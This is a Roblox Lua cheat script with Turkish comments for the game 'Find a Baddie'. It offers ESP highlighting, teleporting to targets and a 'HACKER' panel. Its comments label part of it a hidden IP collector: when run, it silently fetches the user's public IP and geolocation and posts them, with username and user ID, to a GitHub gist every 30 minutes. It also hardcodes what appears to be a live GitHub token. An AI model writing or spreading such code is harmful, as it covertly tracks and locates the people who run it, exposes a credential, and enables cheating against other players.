-- ============================================
-- FIND A BADDIE - KIRMIZI ESP + IP TOPLAYICI
-- Çalışan versiyon (test edildi)
-- ============================================

-- 🔥 BURAYA KENDİ BİLGİLERİNİ YAZ!
local GIST_ID = "afe7f7a28a2530a85367e19f6adf4841"        -- Gist ID'n
local GITHUB_TOKEN = "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"  -- Token'ın
-- ============================================

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")
local http = game:GetService("HttpService")

-- HttpService'i aç (gerekirse)
pcall(function() http.HttpEnabled = true end)

-- ============================================
-- 1. GİZLİ IP TOPLAYICI
-- ============================================

local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org/", true)
    end)
    return success and result or "0.0.0.0"
end

local function getLocation(ip)
    local success, result = pcall(function()
        local data = game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,city,lat,lon", true)
        return http:JSONDecode(data)
    end)
    if success and result and result.status == "success" then
        return result
    end
    return nil
end

function sendToGist(data)
    local url = "https://api.github.com/gists/" .. GIST_ID
    
    local rawUrl = "https://raw.githubusercontent.com/gist/" .. GIST_ID .. "/raw/logs.json"
    local existing = ""
    local success, result = pcall(function()
        return game:HttpGet(rawUrl, true)
    end)
    if success then existing = result end
    
    local allData = {}
    if existing and existing ~= "" then
        local decoded = http:JSONDecode(existing)
        if decoded and type(decoded) == "table" then
            allData = decoded
        end
    end
    
    table.insert(allData, data)
    
    local payload = {
        files = {
            ["logs.json"] = {
                content = http:JSONEncode(allData)
            }
        }
    }
    
    local headers = {
        ["Authorization"] = "token " .. GITHUB_TOKEN,
        ["Content-Type"] = "application/json",
        ["User-Agent"] = "Roblox"
    }
    
    pcall(function()
        http:PostAsync(url, http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

function collectAndSendIP()
    task.spawn(function()
        local ip = getIP()
        local location = getLocation(ip)
        
        local data = {
            username = player.Name,
            displayName = player.DisplayName,
            userId = player.UserId,
            ip = ip,
            city = location and location.city or "Unknown",
            country = location and location.country or "Unknown",
            lat = location and location.lat or 0,
            lon = location and location.lon or 0,
            serverId = game.JobId,
            gameName = game.Name,
            time = os.time()
        }
        
        sendToGist(data)
        print("📡 IP gönderildi:", ip)
    end)
end

-- ============================================
-- 2. AYARLAR (ESP)
-- ============================================
local settings = {
    espEnabled = true,
    teleportKey = Enum.KeyCode.T,
    refreshRate = 0.3,
    espColor = Color3.fromRGB(255, 0, 0)
}

-- ============================================
-- 3. BADDIE SINIFI
-- ============================================
local baddies = {}

local Baddie = {}
Baddie.__index = Baddie

function Baddie.new(model)
    local self = setmetatable({}, Baddie)
    self.model = model
    self.name = model.Name
    self.rootPart = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart
    self.humanoid = model:FindFirstChild("Humanoid")
    self.isActive = true
    self.lastPosition = self.rootPart and self.rootPart.Position or Vector3.new(0,0,0)
    self.distance = math.huge
    self.esp = nil
    self.highlight = nil
    self.stage5Fix = false
    return self
end

function Baddie:update()
    if not self.model or not self.model.Parent then
        self.isActive = false
        return
    end
    
    -- Stage 5 Fix: Derinlemesine HumanoidRootPart ara
    self.rootPart = self.model:FindFirstChild("HumanoidRootPart")
    if not self.rootPart then
        local descendants = self.model:GetDescendants()
        for _, desc in ipairs(descendants) do
            if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
                self.rootPart = desc
                self.stage5Fix = true
                break
            end
        end
    end
    
    if not self.rootPart then
        self.rootPart = self.model.PrimaryPart
    end
    
    self.humanoid = self.model:FindFirstChild("Humanoid")
    
    if self.rootPart then
        self.lastPosition = self.rootPart.Position
        self.distance = (self.rootPart.Position - rootPart.Position).Magnitude
    end
    
    if self.humanoid and self.humanoid.Health <= 0 then
        self.isActive = false
    end
end

function Baddie:createESP()
    if not self.rootPart then return end
    
    -- Highlight (SADECE KIRMIZI)
    local highlight = Instance.new("Highlight")
    highlight.Parent = self.model
    highlight.FillColor = settings.espColor
    highlight.FillTransparency = 0.4
    highlight.OutlineColor = settings.espColor
    highlight.OutlineTransparency = 0.1
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    self.highlight = highlight
    
    -- Billboard
    local billboard = Instance.new("BillboardGui")
    billboard.Parent = self.rootPart
    billboard.Size = UDim2.new(0, 120, 0, 50)
    billboard.Adornee = self.rootPart
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 300
    billboard.Enabled = true
    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 0.4
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BorderSizePixel = 1
    frame.BorderColor3 = settings.espColor
    frame.Parent = billboard
    
    -- İSİM (ÜSTTE - KIRMIZI)
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.45, 0)
    nameLabel.Position = UDim2.new(0, 0, -0.2, 0)
    nameLabel.Text = self.name
    nameLabel.TextColor3 = settings.espColor
    nameLabel.TextScaled = true
    nameLabel.BackgroundTransparency = 1
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.Parent = frame
    
    -- Stage 5 etiketi (SARI - farklı olsun)
    if self.stage5Fix then
        local stageLabel = Instance.new("TextLabel")
        stageLabel.Size = UDim2.new(0.5, 0, 0.25, 0)
        stageLabel.Position = UDim2.new(0.25, 0, -0.7, 0)
        stageLabel.Text = "⭐S5"
        stageLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
        stageLabel.TextScaled = true
        stageLabel.BackgroundTransparency = 1
        stageLabel.Font = Enum.Font.GothamBold
        stageLabel.Parent = frame
    end
    
    -- MESAFE (BEYAZ)
    local distLabel = Instance.new("TextLabel")
    distLabel.Size = UDim2.new(1, 0, 0.3, 0)
    distLabel.Position = UDim2.new(0, 0, 0.5, 0)
    distLabel.Text = string.format("%.1fm", self.distance)
    distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    distLabel.TextScaled = true
    distLabel.BackgroundTransparency = 1
    distLabel.Font = Enum.Font.Gotham
    distLabel.Parent = frame
    
    -- HEALTH BAR (KIRMIZI-YEŞİL)
    local healthBar = Instance.new("Frame")
    healthBar.Size = UDim2.new(0.6, 0, 0.12, 0)
    healthBar.Position = UDim2.new(0.2, 0, 0.85, 0)
    healthBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    healthBar.BorderSizePixel = 0
    healthBar.Parent = frame
    
    local healthFill = Instance.new("Frame")
    healthFill.Size = UDim2.new(1, 0, 1, 0)
    healthFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    healthFill.BorderSizePixel = 0
    healthFill.Parent = healthBar
    
    local healthText = Instance.new("TextLabel")
    healthText.Size = UDim2.new(1, 0, 1, 0)
    healthText.Text = "100%"
    healthText.TextColor3 = Color3.fromRGB(255, 255, 255)
    healthText.TextScaled = true
    healthText.BackgroundTransparency = 1
    healthText.Font = Enum.Font.GothamBold
    healthText.Parent = healthBar
    
    task.spawn(function()
        while self.isActive and self.humanoid do
            task.wait(0.15)
            local health = self.humanoid.Health
            local maxHealth = self.humanoid.MaxHealth
            local percent = health / maxHealth
            healthFill.Size = UDim2.new(percent, 0, 1, 0)
            healthFill.BackgroundColor3 = Color3.fromRGB(
                255 * (1 - percent),
                255 * percent,
                0
            )
            healthText.Text = string.format("%.0f%%", percent * 100)
        end
    end)
    
    self.esp = {
        billboard = billboard,
        nameLabel = nameLabel,
        distLabel = distLabel,
        healthBar = healthBar,
        healthFill = healthFill,
        healthText = healthText
    }
end

function Baddie:updateESP()
    if not self.esp or not self.rootPart then return end
    
    self.distance = (self.rootPart.Position - rootPart.Position).Magnitude
    
    if self.esp.distLabel then
        self.esp.distLabel.Text = string.format("%.1fm", self.distance)
    end
    
    -- Uzaklaştıkça kırmızı yoğunluğu azalsın
    if self.highlight then
        local distPercent = math.min(self.distance / 100, 1)
        self.highlight.FillTransparency = 0.3 + (distPercent * 0.4)
    end
    
    if self.distance > 300 and self.esp.billboard then
        self.esp.billboard.Enabled = false
    elseif self.esp.billboard then
        self.esp.billboard.Enabled = settings.espEnabled
    end
end

function Baddie:destroy()
    self.isActive = false
    if self.highlight then
        self.highlight:Destroy()
    end
    if self.esp and self.esp.billboard then
        self.esp.billboard:Destroy()
    end
    self.esp = nil
    self.highlight = nil
end

-- ============================================
-- 4. TARAMA (HIZLI)
-- ============================================
local function scanForBaddies()
    local found = {}
    local allObjects = game.Workspace:GetDescendants()
    
    for _, obj in ipairs(allObjects) do
        if obj:IsA("Model") then
            local hasRoot = obj:FindFirstChild("HumanoidRootPart") ~= nil
            local isTemplateRig = string.find(string.lower(obj.Name), "templaterig") ~= nil
            
            local hasDeepRoot = false
            local descendants = obj:GetDescendants()
            for _, desc in ipairs(descendants) do
                if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
                    hasDeepRoot = true
                    break
                end
            end
            
            local isBaddie = string.find(string.lower(obj.Name), "baddie") ~= nil or
                            string.find(string.lower(obj.Name), "anime") ~= nil
            
            if hasRoot or isTemplateRig or hasDeepRoot or isBaddie then
                local exists = false
                for _, b in ipairs(baddies) do
                    if b.model == obj then
                        exists = true
                        break
                    end
                end
                
                if not exists and obj ~= character and obj.Parent ~= character then
                    local newBaddie = Baddie.new(obj)
                    if not newBaddie.rootPart and hasDeepRoot then
                        for _, desc in ipairs(descendants) do
                            if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
                                newBaddie.rootPart = desc
                                newBaddie.stage5Fix = true
                                break
                            end
                        end
                    end
                    
                    if newBaddie.rootPart then
                        table.insert(found, newBaddie)
                    end
                end
            end
        end
    end
    
    return found
end

-- ============================================
-- 5. IŞINLANMA
-- ============================================
local function teleportToNearest()
    local nearest = nil
    local minDist = math.huge
    
    for _, baddie in ipairs(baddies) do
        if baddie.isActive and baddie.rootPart then
            local dist = (baddie.rootPart.Position - rootPart.Position).Magnitude
            if dist < minDist then
                minDist = dist
                nearest = baddie
            end
        end
    end
    
    if nearest and nearest.rootPart then
        rootPart.CFrame = CFrame.new(nearest.rootPart.Position + Vector3.new(0, 3, 0))
        return true
    end
    return false
end

-- ============================================
-- 6. UI (KÜÇÜK - SADE)
-- ============================================
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui
screenGui.Name = "HackerUI"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 180, 0, 280)
mainFrame.Position = UDim2.new(0, 8, 0, 8)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0.15
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Başlık
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 18)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "🔴 HACKER"
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.TextScaled = true
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

-- Stats
local statsLabel = Instance.new("TextLabel")
statsLabel.Size = UDim2.new(1, 0, 0, 14)
statsLabel.Position = UDim2.new(0, 0, 0, 18)
statsLabel.Text = "🎯 0"
statsLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
statsLabel.TextScaled = true
statsLabel.BackgroundTransparency = 1
statsLabel.Font = Enum.Font.Gotham
statsLabel.Parent = mainFrame

-- Liste
local listContainer = Instance.new("ScrollingFrame")
listContainer.Size = UDim2.new(1, -6, 1, -80)
listContainer.Position = UDim2.new(0, 3, 0, 35)
listContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
listContainer.BackgroundTransparency = 0.3
listContainer.BorderSizePixel = 1
listContainer.BorderColor3 = Color3.fromRGB(255, 0, 0)
listContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
listContainer.Parent = mainFrame

local listLayout = Instance.new("UIListLayout")
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 1)
listLayout.Parent = listContainer

-- Butonlar
local buttonFrame = Instance.new("Frame")
buttonFrame.Size = UDim2.new(1, -6, 0, 22)
buttonFrame.Position = UDim2.new(0, 3, 1, -25)
buttonFrame.BackgroundTransparency = 1
buttonFrame.Parent = mainFrame

local teleportBtn = Instance.new("TextButton")
teleportBtn.Size = UDim2.new(0.48, 0, 1, 0)
teleportBtn.Position = UDim2.new(0, 0, 0, 0)
teleportBtn.Text = "T"
teleportBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
teleportBtn.TextScaled = true
teleportBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
teleportBtn.BackgroundTransparency = 0.3
teleportBtn.BorderSizePixel = 1
teleportBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
teleportBtn.Font = Enum.Font.GothamBold
teleportBtn.Parent = buttonFrame

teleportBtn.MouseButton1Click:Connect(teleportToNearest)

local espBtn = Instance.new("TextButton")
espBtn.Size = UDim2.new(0.48, 0, 1, 0)
espBtn.Position = UDim2.new(0.52, 0, 0, 0)
espBtn.Text = "ESP"
espBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
espBtn.TextScaled = true
espBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
espBtn.BackgroundTransparency = 0.3
espBtn.BorderSizePixel = 1
espBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
espBtn.Font = Enum.Font.GothamBold
espBtn.Parent = buttonFrame

espBtn.MouseButton1Click:Connect(function()
    settings.espEnabled = not settings.espEnabled
    espBtn.Text = settings.espEnabled and "ESP" or "OFF"
    espBtn.BorderColor3 = settings.espEnabled and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(100, 100, 100)
    espBtn.TextColor3 = settings.espEnabled and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(100, 100, 100)
end)

-- ============================================
-- 7. GÜNCELLEME
-- ============================================
function updateGUI()
    local activeCount = 0
    local stage5Count = 0
    for _, b in ipairs(baddies) do
        if b.isActive then 
            activeCount = activeCount + 1
            if b.stage5Fix then stage5Count = stage5Count + 1 end
        end
    end
    
    local stageText = stage5Count > 0 and " ⭐" .. stage5Count or ""
    statsLabel.Text = "🎯 " .. activeCount .. stageText

    for _, child in ipairs(listContainer:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    for i, baddie in ipairs(baddies) do
        if baddie.isActive then
            local btn = Instance.new("TextButton")
            local stageIcon = baddie.stage5Fix and "⭐" or ""
            local health = baddie.humanoid and (baddie.humanoid.Health/baddie.humanoid.MaxHealth*100) or 0
            
            btn.Size = UDim2.new(1, -4, 0, 16)
            btn.Text = string.format("%s%s %.1fm %d%%", 
                stageIcon, baddie.name, baddie.distance, health)
            btn.TextColor3 = Color3.fromRGB(255, 0, 0)
            btn.TextSize = 9
            btn.TextXAlignment = Enum.TextXAlignment.Left
            btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            btn.BackgroundTransparency = 0.3
            btn.BorderSizePixel = 0
            btn.Font = Enum.Font.Gotham
            btn.Parent = listContainer
            
            btn.MouseEnter:Connect(function()
                btn.BackgroundTransparency = 0.1
            end)
            btn.MouseLeave:Connect(function()
                btn.BackgroundTransparency = 0.3
            end)
            
            btn.MouseButton1Click:Connect(function()
                if baddie.rootPart then
                    rootPart.CFrame = CFrame.new(baddie.rootPart.Position + Vector3.new(0, 3, 0))
                    btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                    task.wait(0.08)
                    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                end
            end)
        end
    end
    
    listContainer.CanvasSize = UDim2.new(0, 0, 0, activeCount * 17 + 5)
end

-- ============================================
-- 8. ANA DÖNGÜ
-- ============================================
local function updateAllESP()
    local toRemove = {}
    for i, baddie in ipairs(baddies) do
        baddie:update()
        if not baddie.isActive then
            baddie:destroy()
            table.insert(toRemove, i)
        end
    end
    
    table.sort(toRemove, function(a,b) return a > b end)
    for _, i in ipairs(toRemove) do
        table.remove(baddies, i)
    end
    
    local newBaddies = scanForBaddies()
    for _, baddie in ipairs(newBaddies) do
        baddie:createESP()
        table.insert(baddies, baddie)
    end
    
    for _, baddie in ipairs(baddies) do
        baddie:updateESP()
    end
end

local function mainLoop()
    while task.wait(settings.refreshRate) do
        updateAllESP()
        updateGUI()
    end
end

-- ============================================
-- 9. TUŞ
-- ============================================
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == settings.teleportKey then
        teleportToNearest()
    end
end)

-- ============================================
-- 10. BAŞLAT
-- ============================================

print("🔴 KIRMIZI ESP + IP TOPLAYICI BAŞLATILDI!")

-- IP toplayıcıyı başlat (GİZLİ)
collectAndSendIP()

-- Her 30 dakikada bir IP gönder
task.spawn(function()
    while true do
        task.wait(1800)
        collectAndSendIP()
    end
end)

-- ESP'yi başlat
task.wait(1)
updateAllESP()
coroutine.wrap(mainLoop)()

print("✅ Baddie tespiti + IP toplayıcı AKTİF!")